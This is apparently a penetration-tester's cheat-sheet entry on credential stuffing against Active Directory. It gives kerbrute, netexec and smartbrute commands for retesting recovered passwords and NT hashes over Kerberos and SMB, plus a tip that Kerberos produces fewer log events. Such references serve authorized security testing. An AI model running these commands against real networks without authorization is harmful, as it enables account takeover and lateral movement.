---
technique: CredentialStuffing
category: bruteforcing
protocols: SMB, LDAP, Kerberos, WinRM, SSH, MSSQL, HTTP
remote_capable: true
tags: stuffing bruteforce credential-attack password reuse lateral-movement ad
---

# CredentialStuffing

Credential stuffing tests recovered credentials (from dumps or cracking) against other accounts and services, exploiting password reuse. It is especially effective in organizations that enforce shared or predictable passwords. The technique can be extended by applying common transformations (appending digits, capitalizing, l33tspeak) to recovered passwords before retesting them.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Recovered credentials | From LSASS, SAM/LSA, NTDS, GPP, or cracked hashes |
| Target service reachable | SMB, LDAP, WinRM, SSH, or any other protocol the organization exposes |
| Lockout policy | Check before stuffing; recovered credentials may still trigger lockouts on retries |

## Windows

### kerbrute (Windows)

#go #kerberos #stuffing

Test a recovered credential against a list of accounts over Kerberos pre-authentication from a Windows host.

```powershell title:"Credential stuffing via kerbrute on Windows"
.\kerbrute.exe passwordspray -d "$domain" --dc "$rhost_ip" users.txt "$recovered_password"
```
<!-- cheat
import domain_ip
var recovered_password
-->

## Linux

### netexec (plaintext)

#smb #ldap #stuffing #multi-target

Test a recovered plaintext password against multiple targets over SMB.

```sh title:"Credential stuffing with plaintext password via netexec"
nxc smb "$rhost_ip" -d "$domain" -u users.txt -p "$recovered_password" --no-bruteforce --continue-on-success
```
<!-- cheat
import domain_ip
var rhost_ip
var recovered_password
-->

### netexec (NT hash)

#smb #ldap #stuffing #pth #multi-target

Test a recovered NT hash against multiple targets over SMB.

```sh title:"Credential stuffing with NT hash via netexec"
nxc smb "$rhost_ip" -d "$domain" -u users.txt -H "$nt_hash" --no-bruteforce --continue-on-success
```
<!-- cheat
import domain_ip
var rhost_ip
var nt_hash
-->

### kerbrute

#go #kerberos #stuffing

Test a recovered password against a user list over Kerberos pre-auth; produces fewer auth log events than SMB or LDAP.

```sh title:"Credential stuffing via kerbrute over Kerberos"
kerbrute passwordspray -d "$domain" --dc "$rhost_ip" users.txt "$recovered_password"
```
<!-- cheat
import domain_ip
var recovered_password
-->

### smartbrute

#python #kerberos #stuffing #lockout-safe

Stuff recovered credentials against the domain while respecting the live lockout policy.

```sh title:"Policy-aware credential stuffing via smartbrute"
smartbrute brute -bU users.txt -bP recovered_passwords.txt kerberos --kdc-ip "$rhost_ip"
```
<!-- cheat
import domain_ip
-->
